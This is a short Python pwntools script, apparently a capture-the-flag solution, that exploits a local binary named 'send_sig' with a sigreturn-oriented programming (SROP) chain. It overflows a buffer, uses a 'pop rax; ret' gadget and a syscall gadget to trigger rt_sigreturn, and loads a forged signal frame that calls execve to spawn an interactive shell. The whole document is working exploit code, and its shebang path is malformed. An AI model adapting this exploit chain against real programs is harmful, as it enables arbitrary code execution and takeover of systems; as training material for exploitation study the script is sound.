#!/bin/usr/python3

from pwn import *

context.arch = "amd64"
p = process('./send_sig')
e = ELF('./send_sig')

# pop_rax = 0x4010ae
pop_rax = next(e.search(asm("pop rax; ret")))
#syscall = 0x4010b0
syscall = next(e.search(asm("syscall")))


payload = b'A'*0x10 + p64(pop_rax) + p64(0xf) + p64(syscall)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402000
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall

rop = payload + bytes(frame)

p.sendafter("Signal:", rop)
p.interactive()